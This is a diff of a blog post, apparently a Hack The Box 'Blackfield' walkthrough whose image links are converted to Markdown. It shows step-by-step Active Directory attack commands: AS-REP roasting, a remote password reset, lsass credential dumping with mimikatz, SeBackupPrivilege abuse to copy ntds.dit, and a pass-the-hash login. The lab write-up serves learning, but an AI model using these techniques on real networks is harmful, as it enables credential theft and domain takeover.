@@ -57,7 +57,7 @@ We attempt to enumerate `smb` with a null session using `smbmap` but no dice, ho
 Command:
 `smbclient -L ////10.10.10.192// -U ''`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-69.png" >}}
+![](/images/2020/06/image-69.png)
 
 We seem to be able to connect via `rpcclient`.
 
@@ -71,14 +71,14 @@ Command:
 
 We log in but are denied listing access in this share.
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-70.png" >}}
+![](/images/2020/06/image-70.png)
 
 We try again against the `profiles$` share and get quite a few results!
 
 Command:
 `smbclient //10.10.10.192/profiles$`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-71.png" >}}
+![](/images/2020/06/image-71.png)
 
 Now we need to take all these usernames and create a user list. We can copy the output of this file and save it as `users.lst`. Now we need to clean it up. To do this we issue a simple `awk` command.
 
@@ -90,7 +90,7 @@ Now we have a cleaned up user list! We can sift through it to see what is listed
 Command:
 `python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py blackfield.local/ -usersfile cleaned_users.lst -format john -output hashes.lst -dc-ip 10.10.10.192`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/blackfield_hash.gif" >}}
+![](/images/2020/06/blackfield_hash.gif)
 
 We get a few hashes we can feed over to `john`.
 
@@ -99,7 +99,7 @@ Command:
 
 We get back a password of `#00^BlackKnight` for the user `support`.
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-72.png" >}}
+![](/images/2020/06/image-72.png)
 
 Now with these credentials we'll want to use them to authenticate back to our `smb` shares and `rpcclient` for futher enumeration. Connecting to the `forensic` share still has listing denied. We are able to connect via `rpcclient` and enumerate a bit further.
 
@@ -111,22 +111,22 @@ Once connected we see that we have more permissions, obviously. We can now `quer
 Command:
 `setuserinfo2 audit2020 23 'Password123!`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-73.png" >}}
+![](/images/2020/06/image-73.png)
 
 Now we'll try to login as `audit2020` to the previous `smb` shares to see what access they might have.
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-74.png" >}}
+![](/images/2020/06/image-74.png)
 
 As we enumerate through the contents of these directories, we get some files and see some other interesting tools listed. As we look at the content of the files, we see an interesting user account:
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-75.png" >}}
+![](/images/2020/06/image-75.png)
 
 As we continue to look at the data available it's pretty obvious that the files we want to look at are far too large to download via the `smbclient`. Time to mount the location.
 
 Command:
 `mount -t cifs //10.10.10.192/forensic ~/Documents/htb/blackfield/mount -o user=audit2020`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-76.png" >}}
+![](/images/2020/06/image-76.png)
 
 With that mounted we head right over to the `lsass.zip` file. We want this file in particular because if it is a dump, we can [obtain credentials](https://www.hackingarticles.in/credential-dumping-local-security-authority-lsalsass-exe/) from it. So we copy the file a few levels back and extract it.
 
@@ -139,21 +139,21 @@ First we set our debug.
 Command:
 `privilege::debug`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-77.png" >}}
+![](/images/2020/06/image-77.png)
 
 Next we load up the dump file.
 
 Command:
 `sekurlsa::minidump C:\Users\Commando\Downloads\x64\lsass.DMP`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-78.png" >}}
+![](/images/2020/06/image-78.png)
 
 Now we dump the creds.
 
 Command:
 `sekurlsa::LogonPasswords`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-79.png" >}}
+![](/images/2020/06/image-79.png)
 
 This starts to kick out a ton of info. Weget `NTLM` hashes for `Administrator` and for `svc_backup`. We can simply use these hashes for `Evil-WinRM`.
 
@@ -181,7 +181,7 @@ Command:
 
 That didn't work. It looks like the commands are being truncated.
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-80.png" caption="" >}}
+![](/images/2020/06/image-80.png" caption=")
 
 We modify the script, reupload and rerun. Another error. This time saying we needt o set a metadata writeable directory. In this case we can use the `NOWRITERS` option in our `SET` line, thanks [Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow).
 
@@ -195,7 +195,7 @@ expose %mydrive9% z:x
 
 We rerun the command and it works!
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-81.png" >}}
+![](/images/2020/06/image-81.png)
 
 So now that we have access to this copy of a the drive, how do we leverage it? Some googling around from our previous exploit lead us [here](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug). This GitHub repo has some .dll we can import and use. We upload them to our target and import them into our PowerShell session, [as shown](https://github.com/giuliano108/SeBackupPrivilege).
 
@@ -208,7 +208,7 @@ With those imported we can run the provided command to copy the file.
 Command:
 `Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/image-82.png" >}}
+![](/images/2020/06/image-82.png)
 
 Now we have a copy of the `ntds.dit`. Next we need a copy of the system hive. We run the following to save that cluster.
 
@@ -225,7 +225,7 @@ Now we have our hashes, we can use the same method as before to pass the Adminis
 Command:
 `evil-winrm.rb -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee`
 
-{{< figure src="__GHOST_URL__/content/images/2020/06/blackfield_root.gif" >}}
+![](/images/2020/06/blackfield_root.gif)
 
 We are in as Admin! We head over and snag the `root.txt` flag!
 
